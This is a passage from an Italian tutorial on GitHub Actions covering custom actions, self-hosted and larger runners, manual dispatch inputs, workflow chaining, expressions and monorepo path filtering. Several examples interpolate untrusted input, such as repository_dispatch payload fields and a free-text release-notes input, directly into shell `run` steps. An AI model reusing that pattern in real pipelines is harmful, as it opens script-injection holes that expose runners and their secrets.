    --severity-level "$SEVERITY" || true
  FINDINGS=$((FINDINGS + $(jq '.results | length' /tmp/bandit-report.json)))
fi

echo "::endgroup::"

# Scrivere gli output
echo "findings-count=$FINDINGS" >> "$GITHUB_OUTPUT"

# Generare job summary
echo "## Security Scan Results" >> "$GITHUB_STEP_SUMMARY"
echo "- **Findings**: $FINDINGS" >> "$GITHUB_STEP_SUMMARY"
echo "- **Severity threshold**: $SEVERITY" >> "$GITHUB_STEP_SUMMARY"

if [ "$FINDINGS" -gt 0 ] && [ "$FAIL_ON_FINDINGS" = "true" ]; then
  echo "::error::Found $FINDINGS security issues at severity $SEVERITY or above"
  exit 1
fi
```

### Docker Action con Immagine Pre-built

Per evitare il tempo di build del Dockerfile ad ogni esecuzione, usare un'immagine pre-built dal registry:

```yaml
# action.yml con immagine pre-built
runs:
  using: 'docker'
  image: 'docker://ghcr.io/org/security-scanner:v1.2.0'
  args:
    - ${{ inputs.scan-path }}
```

### Confronto tra i tre tipi di Custom Actions

| Aspetto | Composite | JavaScript/TypeScript | Docker |
|---------|-----------|----------------------|--------|
| Linguaggio | YAML (step) | JavaScript/TypeScript | Qualsiasi |
| Velocità | Veloce | Veloce | Lenta (build container) |
| Piattaforme | Tutte | Tutte | Solo Linux |
| Dipendenze | Azioni esistenti | npm packages | Qualsiasi (nel container) |
| Complessità | Bassa | Media | Media-Alta |
| Isolamento | Nessuno (stesso runner) | Parziale (stesso runner) | Completo (container) |
| Accesso API | Tramite `gh` CLI | `@actions/github` nativo | Via CLI o librerie |
| Debug | Limitato | Completo (source maps) | Completo (container) |
| Uso ideale | Raggruppare step | Logica complessa, API | Tool specifici, isolamento |

---

## Self-Hosted Runners

### Setup di Base

```bash
# 1. Scaricare il runner (da Settings > Actions > Runners > New self-hosted runner)
mkdir actions-runner && cd actions-runner
curl -o actions-runner-linux-x64.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz
tar xzf actions-runner-linux-x64.tar.gz

# 2. Configurare
./config.sh --url https://github.com/org/repo \
  --token AXXXXXXXXXXXXXXXXX \
  --name "my-runner" \
  --labels "linux,x64,gpu" \
  --work "_work"

# 3. Avviare come servizio
sudo ./svc.sh install
sudo ./svc.sh start

# 4. Verificare lo stato
sudo ./svc.sh status
```

### Labels e Groups

```yaml
# Usare un self-hosted runner con labels specifiche
jobs:
  gpu-test:
    runs-on: [self-hosted, linux, gpu]
    steps:
      - run: nvidia-smi
      - run: python train_model.py

  arm-build:
    runs-on: [self-hosted, linux, arm64]
    steps:
      - run: make build-arm
```

### Runner Groups (Enterprise/Organization)

```bash
# Creare un runner group (richiede Enterprise o Organization)
gh api orgs/{org}/actions/runner-groups -X POST \
  -f name="production-runners" \
  -F visibility="selected" \
  -F selected_repository_ids[]="12345" \
  -F selected_repository_ids[]="67890"
```

### Self-Hosted Runner con Docker

```dockerfile
# Dockerfile per un runner self-hosted
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    curl jq git sudo \
    docker.io docker-compose-plugin \
    nodejs npm python3 python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Creare utente non-root
RUN useradd -m runner && \
    usermod -aG docker runner

WORKDIR /home/runner

# Scaricare e installare il runner
ARG RUNNER_VERSION=2.311.0
RUN curl -fLo runner.tar.gz \
    "https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-linux-x64-${RUNNER_VERSION}.tar.gz" && \
    tar xzf runner.tar.gz && \
    rm runner.tar.gz && \
    ./bin/installdependencies.sh

USER runner

# Lo startup script configura e avvia il runner
COPY entrypoint.sh .
ENTRYPOINT ["./entrypoint.sh"]
```

### Sicurezza dei Self-Hosted Runners

```yaml
# ATTENZIONE: I self-hosted runners NON sono isolati come i runner GitHub-hosted
# Non usare self-hosted runners per repository pubblici (rischio di esecuzione di codice malevolo)

# Best practices:
# 1. Usare runner effimeri (si creano e distruggono per ogni job)
# 2. Non conservare credenziali sul runner
# 3. Limitare l'accesso ai runner tramite runner groups
# 4. Aggiornare regolarmente il software del runner
# 5. Monitorare l'attività del runner

# Runner effimero (configurazione --ephemeral)
./config.sh --url https://github.com/org/repo \
  --token AXXXXXXXXXXXXXXXXX \
  --ephemeral  # Il runner si deregistra dopo aver completato un job
```

### Autoscaling con Kubernetes (ARC)

```bash
# Actions Runner Controller per Kubernetes
# Installa via Helm
helm install arc \
  --namespace "arc-systems" \
  --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

# Configura un runner scale set
helm install arc-runner-set \
  --namespace "arc-runners" \
  --create-namespace \
  --set githubConfigUrl="https://github.com/org" \
  --set githubConfigSecret.github_token="ghp_xxx" \
  --set maxRunners=10 \
  --set minRunners=1 \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
```

```yaml
# Usare i runner ARC
jobs:
  build:
    runs-on: arc-runner-set
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

### Monitoraggio dei Self-Hosted Runners

Monitorare lo stato e l'utilizzo dei runner è essenziale per mantenere un'infrastruttura CI/CD affidabile:

```bash
# Elencare tutti i runner del repository
gh api repos/{owner}/{repo}/actions/runners --jq '.runners[] | {name, status, busy, labels: [.labels[].name]}'

# Elencare i runner dell'organizzazione
gh api orgs/{org}/actions/runners --jq '.runners[] | {name, status, busy, os, labels: [.labels[].name]}'

# Verificare i runner offline
gh api orgs/{org}/actions/runners --jq '.runners[] | select(.status == "offline") | .name'

# Statistiche di utilizzo
gh api orgs/{org}/actions/runners --jq '
  "Total: \(.total_count)",
  "Online: \([.runners[] | select(.status == "online")] | length)",
  "Busy: \([.runners[] | select(.busy == true)] | length)",
  "Idle: \([.runners[] | select(.status == "online" and .busy == false)] | length)",
  "Offline: \([.runners[] | select(.status == "offline")] | length)"
'
```

Workflow di health check per i runner:

```yaml
name: Runner Health Check
on:
  schedule:
    - cron: '*/30 * * * *'  # Ogni 30 minuti

jobs:
  check-runners:
    runs-on: ubuntu-latest
    steps:
      - name: Check runner status
        env:
          GH_TOKEN: ${{ secrets.RUNNER_MANAGEMENT_TOKEN }}
        run: |
          OFFLINE=$(gh api orgs/${{ github.repository_owner }}/actions/runners \
            --jq '[.runners[] | select(.status == "offline")] | length')

          if [ "$OFFLINE" -gt 0 ]; then
            NAMES=$(gh api orgs/${{ github.repository_owner }}/actions/runners \
              --jq '[.runners[] | select(.status == "offline") | .name] | join(", ")')
            echo "::error::$OFFLINE runner(s) offline: $NAMES"
            # Inviare notifica (Slack, email, ecc.)
          fi
```

### Entrypoint Script per Runner Effimero Containerizzato

```bash
#!/bin/bash
set -euo pipefail

# Ottenere il token di registrazione dinamicamente
REGISTRATION_TOKEN=$(curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  "https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/actions/runners/registration-token" \
  | jq -r '.token')

# Configurare il runner in modalità effimera
./config.sh \
  --url "https://github.com/${GITHUB_OWNER}/${GITHUB_REPO}" \
  --token "${REGISTRATION_TOKEN}" \
  --name "runner-$(hostname)" \
  --labels "${RUNNER_LABELS:-linux,x64}" \
  --ephemeral \
  --disableupdate \
  --unattended

# Cleanup alla terminazione
cleanup() {
  echo "Removing runner..."
  ./config.sh remove --token "${REGISTRATION_TOKEN}" || true
}
trap cleanup EXIT SIGTERM SIGINT

# Avviare il runner
./run.sh
```

---

## Larger Runners e Runner GPU/ARM64

GitHub offre runner con risorse maggiori rispetto ai runner standard gratuiti. I "larger runners" sono disponibili per le organizzazioni con piani Team e Enterprise Cloud, e i prezzi sono stati ridotti fino al 39% a partire da gennaio 2026.

### Tipi di Larger Runners

| Tipo | vCPU | RAM | Disco | Prezzo/min (Linux) |
|------|------|-----|-------|-------------------|
| Standard | 2-4 | 7-16 GB | 14 GB SSD | Incluso nel piano |
| 4-core | 4 | 16 GB | 150 GB SSD | $0.016 |
| 8-core | 8 | 32 GB | 300 GB SSD | $0.032 |
| 16-core | 16 | 64 GB | 600 GB SSD | $0.064 |
| 32-core | 32 | 128 GB | 840 GB SSD | $0.128 |
| 64-core | 64 | 256 GB | 2040 GB SSD | $0.256 |

### Runner ARM64

I runner ARM64 sono disponibili sia per Linux che per Windows, con un risparmio del 37% rispetto ai runner x64 equivalenti. Da gennaio 2026, i runner ARM64 standard sono disponibili anche nei repository privati.

```yaml
jobs:
  build-arm:
    runs-on: ubuntu-24.04-arm  # Runner ARM64 Linux
    steps:
      - uses: actions/checkout@v4
      - name: Build for ARM64
        run: |
          uname -m  # Mostra aarch64
          make build

  build-multi-arch:
    strategy:
      matrix:
        include:
          - runner: ubuntu-latest
            arch: amd64
          - runner: ubuntu-24.04-arm
            arch: arm64
    runs-on: ${{ matrix.runner }}
    steps:
      - uses: actions/checkout@v4
      - name: Build for ${{ matrix.arch }}
        run: make build ARCH=${{ matrix.arch }}
```

### Runner GPU

I runner GPU sono specifici per workload di machine learning e AI. L'immagine è costruita da NVIDIA e include CUDA, cuDNN e i driver necessari.

```yaml
jobs:
  train-model:
    # Runner GPU (richiede configurazione nell'organizzazione)
    runs-on: [self-hosted, gpu, linux]
    # oppure con larger runners GPU-enabled
    steps:
      - uses: actions/checkout@v4
      - name: Verify GPU
        run: nvidia-smi
      - name: Train model
        run: |
          python -c "import torch; print(f'CUDA available: {torch.cuda.is_available()}')"
          python train.py --epochs 10 --batch-size 32
```

### Configurare Larger Runners

```bash
# Creare un larger runner tramite l'interfaccia web:
# Organization Settings > Actions > Runners > New runner > New GitHub-hosted runner

# Oppure via API
gh api orgs/{org}/actions/runners/generate-jitconfig -X POST \
  --field name="large-runner-1" \
  --field runner_group_id=1 \
  --field labels[]="large" \
  --field labels[]="16-core" \
  --field work_folder="_work"
```

### Build Multi-Architettura con Docker

```yaml
name: Multi-Arch Docker Build
on:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push multi-arch
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          platforms: linux/amd64,linux/arm64
          tags: |
            ghcr.io/${{ github.repository }}:${{ github.ref_name }}
            ghcr.io/${{ github.repository }}:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

---

## Workflow Dispatch e Input Personalizzati

Il trigger `workflow_dispatch` permette di eseguire un workflow manualmente dall'interfaccia web di GitHub, dalla CLI, o via API. Da dicembre 2025, il limite di input è stato aumentato da 10 a 25.

### Tipi di Input

```yaml
name: Manual Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        type: choice
        required: true
        options:
          - development
          - staging
          - production
        default: staging

      version:
        description: 'Version to deploy (e.g., v1.2.3 or SHA)'
        type: string
        required: true

      dry_run:
        description: 'Perform dry run only'
        type: boolean
        required: false
        default: false

      log_level:
        description: 'Log verbosity level'
        type: choice
        required: false
        options:
          - error
          - warn
          - info
          - debug
        default: info

      target_region:
        description: 'Deployment region'
        type: environment
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.version }}

      - name: Deploy
        env:
          LOG_LEVEL: ${{ inputs.log_level }}
        run: |
          echo "Environment: ${{ inputs.environment }}"
          echo "Version: ${{ inputs.version }}"
          echo "Dry run: ${{ inputs.dry_run }}"
          echo "Region: ${{ inputs.target_region }}"

          if [ "${{ inputs.dry_run }}" = "true" ]; then
            echo "DRY RUN — no changes applied"
          else
            ./deploy.sh \
              --env "${{ inputs.environment }}" \
              --version "${{ inputs.version }}" \
              --region "${{ inputs.target_region }}"
          fi
```

### Trigger via CLI e API

```bash
# Trigger via GitHub CLI
gh workflow run deploy.yml \
  --ref main \
  -f environment=production \
  -f version=v1.2.3 \
  -f dry_run=false

# Trigger via API REST
curl -X POST \
  -H "Authorization: token ${GITHUB_TOKEN}" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/owner/repo/actions/workflows/deploy.yml/dispatches" \
  -d '{
    "ref": "main",
    "inputs": {
      "environment": "production",
      "version": "v1.2.3",
      "dry_run": "false"
    }
  }'

# Monitorare l'esecuzione
gh run list --workflow=deploy.yml --limit 5
gh run watch  # Streaming dei log in tempo reale
```

### Workflow Dispatch con Scheduling Condizionale

Un pattern potente combina `workflow_dispatch` con `schedule` per creare workflow che possono essere eseguiti sia manualmente che automaticamente, con parametri diversi:

```yaml
name: Database Backup
on:
  schedule:
    - cron: '0 2 * * *'  # Ogni notte alle 2:00 UTC
  workflow_dispatch:
    inputs:
      backup_type:
        type: choice
        description: 'Type of backup'
        options:
          - incremental
          - full
        default: incremental
      retention_days:
        type: string
        description: 'Days to retain backup'
        default: '30'

jobs:
  backup:
    runs-on: ubuntu-latest
    env:
      # Se attivato da schedule, usare i default; se manuale, usare gli input
      BACKUP_TYPE: ${{ github.event_name == 'schedule' && 'incremental' || inputs.backup_type }}
      RETENTION: ${{ github.event_name == 'schedule' && '30' || inputs.retention_days }}
    steps:
      - uses: actions/checkout@v4
      - name: Run backup
        run: |
          echo "Trigger: ${{ github.event_name }}"
          echo "Backup type: $BACKUP_TYPE"
          echo "Retention: $RETENTION days"
          ./backup.sh --type "$BACKUP_TYPE" --retention "$RETENTION"
```

### Workflow Dispatch per Release Management

```yaml
name: Release
on:
  workflow_dispatch:
    inputs:
      release_type:
        type: choice
        description: 'Release type'
        options:
          - patch
          - minor
          - major
        default: patch
      pre_release:
        type: boolean
        description: 'Mark as pre-release'
        default: false
      release_notes:
        type: string
        description: 'Release notes (optional)'
        required: false

jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Bump version
        id: version
        run: |
          CURRENT=$(node -p 'require("./package.json").version')
          NEW=$(npx semver "$CURRENT" -i "${{ inputs.release_type }}")
          echo "version=$NEW" >> "$GITHUB_OUTPUT"
          npm version "$NEW" --no-git-tag-version

      - name: Build
        run: npm ci && npm run build

      - name: Create release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          NOTES="${{ inputs.release_notes }}"
          if [ -z "$NOTES" ]; then
            NOTES="Release v${{ steps.version.outputs.version }}"
          fi

          FLAGS=""
          if [ "${{ inputs.pre_release }}" = "true" ]; then
            FLAGS="--prerelease"
          fi

          gh release create "v${{ steps.version.outputs.version }}" \
            --title "v${{ steps.version.outputs.version }}" \
            --notes "$NOTES" \
            $FLAGS \
            dist/*.tar.gz
```

### Workflow Dispatch con Validazione degli Input

```yaml
name: Validated Deploy
on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Semver version (e.g., v1.2.3)'
        type: string
        required: true

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Validate version format
        run: |
          VERSION="${{ inputs.version }}"
          if [[ ! "$VERSION" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9.]+)?$ ]]; then
            echo "::error::Invalid version format: $VERSION. Expected: vX.Y.Z"
            exit 1
          fi
          echo "Version $VERSION is valid"

      - name: Verify tag exists
        run: |
          if ! git ls-remote --tags origin "${{ inputs.version }}" | grep -q .; then
            echo "::error::Tag ${{ inputs.version }} does not exist"
            exit 1
          fi

  deploy:
    needs: validate
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.version }}
      - run: ./deploy.sh
```

---

## Concatenamento di Workflow (Event Chaining)

GitHub Actions supporta diversi meccanismi per collegare workflow tra loro, creando pipeline complesse multi-fase.

### workflow_run — Trigger post-completamento

L'evento `workflow_run` permette di eseguire un workflow quando un altro si completa (con successo, fallimento o cancellazione):

```yaml
# Workflow che si attiva dopo la CI
name: Deploy after CI
on:
  workflow_run:
    workflows: ["CI Pipeline"]
    types: [completed]
    branches: [main]

jobs:
  deploy:
    # Eseguire solo se la CI è passata con successo
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}

      # Scaricare artifacts dal workflow CI
      - name: Download CI artifacts
        uses: actions/download-artifact@v4
        with:
          name: build-output
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}

      - run: ./deploy.sh
```

**Limite importante**: `workflow_run` supporta al massimo 3 livelli di concatenamento. Se il workflow A attiva B, B attiva C, e C attiva D, i workflow E e F non verranno eseguiti.

### repository_dispatch — Trigger esterni

L'evento `repository_dispatch` permette a sistemi esterni (Slack bot, monitoring, altri servizi) di attivare workflow:

```yaml
# Workflow attivato da sistemi esterni
name: External Trigger
on:
  repository_dispatch:
    types: [deploy-request, rollback-request]

jobs:
  handle-event:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Handle deploy request
        if: github.event.action == 'deploy-request'
        run: |
          echo "Deploy requested by: ${{ github.event.client_payload.requester }}"
          echo "Version: ${{ github.event.client_payload.version }}"
          echo "Environment: ${{ github.event.client_payload.environment }}"
          ./deploy.sh \
            --version "${{ github.event.client_payload.version }}" \
            --env "${{ github.event.client_payload.environment }}"

      - name: Handle rollback
        if: github.event.action == 'rollback-request'
        run: |
          echo "Rolling back to: ${{ github.event.client_payload.rollback_version }}"
          ./rollback.sh "${{ github.event.client_payload.rollback_version }}"
```

```bash
# Inviare un repository_dispatch event
curl -X POST \
  -H "Authorization: token ${GITHUB_TOKEN}" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/owner/repo/dispatches" \
  -d '{
    "event_type": "deploy-request",
    "client_payload": {
      "version": "v1.2.3",
      "environment": "production",
      "requester": "slack-bot"
    }
  }'
```

### Cross-Repository Workflow Triggering

```yaml
# Workflow nel repository A che attiva un workflow nel repository B
name: Trigger Downstream
on:
  push:
    branches: [main]

jobs:
  trigger-downstream:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger deploy in infra repo
        uses: peter-evans/repository-dispatch@v3
        with:
          token: ${{ secrets.PAT_TOKEN }}  # PAT con repo scope
          repository: org/infrastructure
          event-type: app-updated
          client-payload: |
            {
              "app": "${{ github.event.repository.name }}",
              "sha": "${{ github.sha }}",
              "version": "${{ github.ref_name }}"
            }
```

### Pattern: Pipeline CI/CD con Separazione dei Workflow

```yaml
# .github/workflows/ci.yml — Workflow CI (attivato su PR e push)
name: CI Pipeline
on:
  pull_request:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
```

```yaml
# .github/workflows/cd.yml — Workflow CD (attivato al completamento della CI)
name: CD Pipeline
on:
  workflow_run:
    workflows: ["CI Pipeline"]
    types: [completed]
    branches: [main]

jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - run: ./deploy.sh
```

---

## Espressioni Avanzate e Funzioni

Le espressioni di GitHub Actions sono un linguaggio di templating che permette di valutare condizioni, manipolare stringhe e accedere ai contesti. Comprendere le funzioni disponibili è fondamentale per costruire workflow flessibili.

### Funzioni di Status Check

Le funzioni di status check determinano se uno step o un job deve essere eseguito in base allo stato dei passi precedenti:

```yaml
steps:
  - name: Build
    id: build
    run: npm run build

  # Eseguire SEMPRE, anche se i passi precedenti falliscono
  - name: Cleanup
    if: always()
    run: rm -rf temp/

  # Eseguire solo se un passo precedente è fallito
  - name: Notify failure
    if: failure()
    run: |
      curl -X POST "$SLACK_WEBHOOK" \
        -d '{"text":"Build failed on ${{ github.ref }}"}'

  # Eseguire solo se il workflow è stato cancellato
  - name: Handle cancellation
    if: cancelled()
    run: echo "Workflow was cancelled"

  # Combinare status check con condizioni
  - name: Upload error logs
    if: failure() && steps.build.outcome == 'failure'
    uses: actions/upload-artifact@v4
    with:
      name: error-logs
      path: logs/

  # success() è il default implicito — equivalente a non specificare if
  - name: Deploy
    if: success()
    run: ./deploy.sh
```

### outcome vs conclusion

La differenza tra `outcome` e `conclusion` è sottile ma importante:

```yaml
steps:
  - name: Risky step
    id: risky
    continue-on-error: true
    run: exit 1

  # outcome = 'failure' (il risultato reale dello step)
  # conclusion = 'success' (perché continue-on-error è true)
  - name: Check result
    run: |
      echo "Outcome: ${{ steps.risky.outcome }}"         # failure
      echo "Conclusion: ${{ steps.risky.conclusion }}"    # success
```

### Funzione hashFiles

`hashFiles` calcola un hash SHA-256 basato sui contenuti dei file che corrispondono a un pattern glob:

```yaml
# Hash di un singolo file
key: ${{ hashFiles('package-lock.json') }}

# Hash di file multipli con pattern
key: ${{ hashFiles('**/package-lock.json') }}

# Hash di file multipli con pattern separati da newline
key: ${{ hashFiles('**/package-lock.json', '**/yarn.lock') }}

# Combinare con runner.os per cache cross-platform
key: ${{ runner.os }}-deps-${{ hashFiles('**/package-lock.json') }}

# Attenzione: hashFiles è case-insensitive su Windows
# e restituisce stringa vuota se nessun file corrisponde al pattern
```

### Funzione contains

```yaml
# Verificare se un array contiene un elemento
if: contains(github.event.pull_request.labels.*.name, 'deploy')

# Verificare una sottostringa (case-insensitive)
if: contains(github.event.head_commit.message, '[skip ci]')

# Combinare con NOT
if: "!contains(github.event.head_commit.message, '[skip ci]')"

# Usare con fromJSON per array dinamici
if: contains(fromJSON('["main", "develop", "release"]'), github.ref_name)
```

### Funzione format

```yaml
# Formattare stringhe con placeholder posizionali
- name: Create tag
  run: echo "Tag: ${{ format('v{0}.{1}.{2}', 1, 2, 3) }}"
  # Output: Tag: v1.2.3

# Caratteri speciali: {{ e }} per i letterali { e }
- run: echo "${{ format('Result: {{{0}}}', steps.test.outputs.score) }}"
  # Output: Result: {95}
```

### Funzioni fromJSON e toJSON

```yaml
# Parsare JSON da output di un passo
- name: Parse config
  id: config
  run: |
    CONFIG='{"regions":["eu-west-1","us-east-1"],"replicas":3}'
    echo "config=$CONFIG" >> "$GITHUB_OUTPUT"

- name: Use parsed config
  run: |
    REGIONS='${{ toJSON(fromJSON(steps.config.outputs.config).regions) }}'
    echo "Regions: $REGIONS"
    echo "Replicas: ${{ fromJSON(steps.config.outputs.config).replicas }}"

# fromJSON per matrix dinamiche
jobs:
  prepare:
    outputs:
      matrix: ${{ steps.set.outputs.matrix }}
    steps:
      - id: set
        run: echo 'matrix=["a","b","c"]' >> "$GITHUB_OUTPUT"

  process:
    needs: prepare
    strategy:
      matrix:
        item: ${{ fromJSON(needs.prepare.outputs.matrix) }}
    steps:
      - run: echo "Processing ${{ matrix.item }}"
```

### Funzione startsWith e endsWith

```yaml
# Verificare il prefisso di una stringa
if: startsWith(github.ref, 'refs/tags/v')

# Verificare il suffisso
if: endsWith(github.event.repository.name, '-service')

# Combinare in condizioni complesse
if: |
  startsWith(github.ref, 'refs/heads/release/') &&
  !endsWith(github.ref, '-hotfix')
```

### Operatori e Type Coercion

```yaml
# GitHub Actions converte automaticamente i tipi:
# - Stringa 'true' → boolean true
# - Numero 0 → boolean false
# - Stringa vuota '' → boolean false
# - null → boolean false

# Attenzione alla coercion con i numeri
if: github.event.pull_request.additions > 100  # Funziona

# Confronto di stringhe
if: github.ref_name == 'main'

# Operatori logici
if: github.ref == 'refs/heads/main' && github.event_name == 'push'
if: github.event_name == 'push' || github.event_name == 'workflow_dispatch'
if: "!(github.event.pull_request.draft)"

# Ternario (non supportato nativamente — usare workaround)
env:
  NODE_ENV: ${{ github.ref == 'refs/heads/main' && 'production' || 'development' }}
```

### Contesti Disponibili

| Contesto | Descrizione | Disponibilità |
|----------|-------------|---------------|
| `github` | Informazioni sul workflow run e sull'evento | Ovunque |
| `env` | Variabili d'ambiente | Step |
| `vars` | Configuration variables | Ovunque |
| `job` | Info sul job corrente | Step |
| `jobs` | Output dei job (solo reusable workflows) | `workflow_call` outputs |
| `steps` | Output e outcome degli step precedenti | Step |
| `runner` | Info sul runner (OS, temp, tool_cache) | Step |
| `secrets` | Segreti del repository/environment | Step |
| `strategy` | Info sulla matrix strategy | Step |
| `matrix` | Valori della matrix corrente | Step |
| `needs` | Output dei job con dipendenza | Job |
| `inputs` | Input del `workflow_dispatch`/`workflow_call` | Workflow/Job |

### Pattern Condizionali Avanzati

#### Deploy condizionale per tipo di file modificato

```yaml
jobs:
  analyze:
    runs-on: ubuntu-latest
    outputs:
      needs_deploy: ${{ steps.check.outputs.needs_deploy }}
      needs_migration: ${{ steps.check.outputs.needs_migration }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2

      - name: Check changed files
        id: check
        run: |
          CHANGED=$(git diff --name-only HEAD~1)

          # Deploy necessario se ci sono cambiamenti nel codice sorgente
          if echo "$CHANGED" | grep -qE '^(src/|lib/|package\.json)'; then
            echo "needs_deploy=true" >> "$GITHUB_OUTPUT"
          else
            echo "needs_deploy=false" >> "$GITHUB_OUTPUT"
          fi

          # Migrazione necessaria se ci sono cambiamenti negli schema
          if echo "$CHANGED" | grep -qE '^(migrations/|prisma/schema)'; then
            echo "needs_migration=true" >> "$GITHUB_OUTPUT"
          else
            echo "needs_migration=false" >> "$GITHUB_OUTPUT"
          fi

  migrate:
    needs: analyze
    if: needs.analyze.outputs.needs_migration == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: ./run-migrations.sh

  deploy:
    needs: [analyze, migrate]
    if: |
      always() &&
      needs.analyze.outputs.needs_deploy == 'true' &&
      (needs.migrate.result == 'success' || needs.migrate.result == 'skipped')
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

#### Matrice condizionale con espressioni composte

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test

      # Coverage solo su Ubuntu con Node 22
      - name: Upload coverage
        if: matrix.os == 'ubuntu-latest' && matrix.node == 22
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage/

      # Step specifico per Windows
      - name: Windows-specific test
        if: runner.os == 'Windows'
        run: npm run test:windows

      # Step sperimentale con continue-on-error
      - name: Experimental check
        if: contains(matrix.os, 'ubuntu') && matrix.node == 22
        continue-on-error: true
        run: npm run test:experimental
```

#### Operatore ternario simulato e pattern di default

```yaml
# GitHub Actions non ha un operatore ternario nativo,
# ma il pattern && || funziona come workaround

env:
  # Se è main, produzione; altrimenti, development
  NODE_ENV: ${{ github.ref == 'refs/heads/main' && 'production' || 'development' }}

  # Se è un tag, usa il nome del tag; altrimenti, usa lo SHA abbreviato
  VERSION: ${{ startsWith(github.ref, 'refs/tags/') && github.ref_name || format('dev-{0}', github.sha) }}

  # Se la variabile è definita, usala; altrimenti, usa il default
  API_TIMEOUT: ${{ vars.API_TIMEOUT || '30' }}

  # Attenzione: questo pattern fallisce se il primo valore è la stringa '0' o 'false'
  # perché && con un valore falsy restituisce quel valore, non il secondo operando
  # In quel caso, usare un if/else esplicito con step separati
```

---

## Monorepo e Path Filtering

I monorepo presentano una sfida unica per CI/CD: non è efficiente eseguire tutti i test e le build ad ogni push quando solo un sottoinsieme del codice è cambiato. GitHub Actions offre diverse strategie per gestire questa situazione.

### Path Filtering Nativo

GitHub Actions supporta il filtro per path direttamente nella definizione del trigger:

```yaml
# Solo il path filtering nativo ha la limitazione di essere a livello di WORKFLOW
# Non è possibile usarlo per job o step individuali
name: Frontend CI
on:
  push:
    branches: [main]
    paths:
      - 'apps/frontend/**'
      - 'packages/shared-ui/**'
      - 'package.json'
      - 'pnpm-lock.yaml'
  pull_request:
    paths:
      - 'apps/frontend/**'
      - 'packages/shared-ui/**'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd apps/frontend && npm test
```

Il filtro nativo ha una limitazione significativa: opera a livello di workflow, non di job. Se un workflow ha 5 job e solo uno è rilevante per i file modificati, tutti e 5 vengono eseguiti o nessuno.

### dorny/paths-filter — Filtering a Livello di Job

L'action `dorny/paths-filter` risolve questa limitazione permettendo il filtering a livello di job e step:

```yaml
name: Monorepo CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      frontend: ${{ steps.filter.outputs.frontend }}
      backend: ${{ steps.filter.outputs.backend }}
      shared: ${{ steps.filter.outputs.shared }}
      infra: ${{ steps.filter.outputs.infra }}
      frontend_files: ${{ steps.filter.outputs.frontend_files }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            frontend:
              - 'apps/frontend/**'
              - 'packages/ui/**'
            backend:
              - 'apps/api/**'
              - 'packages/db/**'
            shared:
              - 'packages/shared/**'
              - 'packages/types/**'
            infra:
              - 'terraform/**'
              - 'docker/**'
          list-files: json  # Output della lista dei file modificati

  test-frontend:
    needs: detect-changes
    if: needs.detect-changes.outputs.frontend == 'true' || needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd apps/frontend && npm ci && npm test

